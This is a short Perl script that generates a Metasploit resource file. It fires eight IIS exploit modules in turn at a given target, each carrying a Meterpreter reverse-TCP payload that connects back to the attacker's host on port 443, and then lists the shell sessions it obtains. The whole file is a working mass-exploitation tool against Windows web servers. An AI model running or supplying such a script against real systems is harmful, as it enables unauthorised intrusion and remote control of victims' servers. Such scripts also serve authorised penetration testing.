if (@ARGV < 2)
	{
	    print "Usage: ./http_win.pl source target > msf_iis_exploit.rc\n";
	} else {

	$source=$ARGV[0];
	$source_port="443";
	$target=$ARGV[1];
	@exploits =("use exploit/windows/iis/iis_webdav_upload_asp","use exploit/windows/iis/ms01_023_printer","use exploit/windows/iis/ms01_026_dbldecode","use exploit/windows/iis/ms01_033_idq","use exploit/windows/iis/ms02_018_htr","use exploit/windows/iis/ms02_065_msadc","use exploit/windows/iis/ms03_007_ntdll_webdav","use exploit/windows/iis/msadc");

foreach $exploit(@exploits) {
print $exploit."\n";
print "set PAYLOAD windows/meterpreter/reverse_tcp"."\n";
print "set LHOST ".$source."\n";
print "set LPORT ".$source_port."\n";
print "set RHOSTS ".$target."\n";
print "set RPORT 80"."\n";
print "spool off"."\n";
print "run"."\n";
print "\n";
}

print "sessions -l"."\n";

	}
  
